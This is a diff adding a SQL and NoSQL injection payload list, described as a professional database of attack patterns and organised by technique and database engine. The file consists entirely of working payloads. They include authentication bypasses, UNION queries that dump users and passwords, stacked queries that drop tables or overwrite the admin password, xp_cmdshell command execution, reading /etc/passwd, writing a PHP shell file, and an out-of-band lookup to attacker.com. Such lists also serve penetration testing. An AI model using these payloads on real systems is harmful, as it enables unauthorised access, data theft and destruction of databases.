@@ -1,0 +1,86 @@
+# SQL Injection Payloads
+# Professional database of SQLi attack patterns
+# Organized by technique
+
+# Basic Boolean-Based
+' OR '1'='1
+' OR 1=1--
+' OR 'a'='a
+admin'--
+' OR '1'='1'--
+') OR ('1'='1
+' OR 1=1#
+' OR 1=1/*
+1' OR '1'='1
+1' OR 1=1--
+
+# Union-Based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+1' UNION SELECT table_name FROM information_schema.tables--
+1' UNION SELECT column_name FROM information_schema.columns--
+' UNION SELECT username,password FROM users--
+
+# Error-Based
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CAST((SELECT @@version) AS int)--
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND updatexml(1,concat(0x7e,version()),1)--
+
+# Time-Based Blind
+'; WAITFOR DELAY '0:0:5'--
+'; SELECT SLEEP(5)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+'; pg_sleep(5)--
+
+# Stacked Queries
+'; DROP TABLE users--
+'; INSERT INTO users VALUES('hacker','hacked')--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+'; EXEC xp_cmdshell('dir')--
+
+# Authentication Bypass
+admin' OR '1'='1'/*
+administrator' OR '1'='1'#
+admin'/*
+' or 1=1 limit 1--
+'or 1=1 or ''='
+' or 'a'='a
+') or ('a'='a
+
+# Second-Order SQLi
+test@test.com' OR '1'='1
+admin@admin.com' UNION SELECT NULL--
+
+# NoSQL Injection (for MongoDB)
+{"$gt":""}
+{"$ne":null}
+{"username":{"$ne":null},"password":{"$ne":null}}
+admin'||'1'=='1
+
+# PostgreSQL Specific
+'; COPY users TO '/tmp/users.txt'--
+'; CREATE TEMP TABLE cmd_exec(output text);--
+
+# MySQL Specific
+' AND 1=0 UNION ALL SELECT 'admin',LOAD_FILE('/etc/passwd')--
+' INTO OUTFILE '/tmp/shell.php'--
+
+# MSSQL Specific
+'; EXEC sp_MSforeachtable "DROP TABLE ?"--
+'; EXEC xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Services\MSSQLServer'--
+
+# Oracle Specific
+' UNION SELECT NULL FROM dual--
+' AND 1=UTL_INADDR.get_host_address('attacker.com')--
+
+# Filter Bypass
+' /*!50000OR*/ 1=1--
+' %6fr 1=1--
+' /**/OR/**/1=1--
+' OR 1=1%00
+admin'/**/OR/**/1=1--
+' UNI%00ON SELECT--
